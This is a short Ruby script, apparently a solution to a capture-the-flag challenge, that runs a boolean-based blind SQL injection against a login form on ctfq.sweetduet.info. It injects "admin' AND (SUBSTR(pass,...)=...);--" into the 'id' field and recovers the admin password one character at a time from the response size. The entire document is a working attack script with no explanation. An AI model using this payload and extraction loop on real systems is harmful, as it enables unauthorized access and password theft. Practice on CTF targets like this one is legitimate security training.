require 'net/http'
require 'uri'

ans = ""
tmp_num = 1

candidates = ('a'..'z').to_a + ('A'..'Z').to_a + (0..9).to_a + ["-", "_"]

while tmp_num <= 21 do
  candidates.each do
    cur = _1

    uri = "http://ctfq.sweetduet.info:10080/~q6/"
    pass = "admin' AND (SUBSTR(pass,#{tmp_num},1) = '#{cur}');--"
    puts "request #{pass}"
    res = Net::HTTP.post_form(URI.parse(uri),
                              { 'id' => pass })
    if res.body.size > 1000
      ans += cur.to_s
      tmp_num += 1
      break;
    end
  end
end

puts ans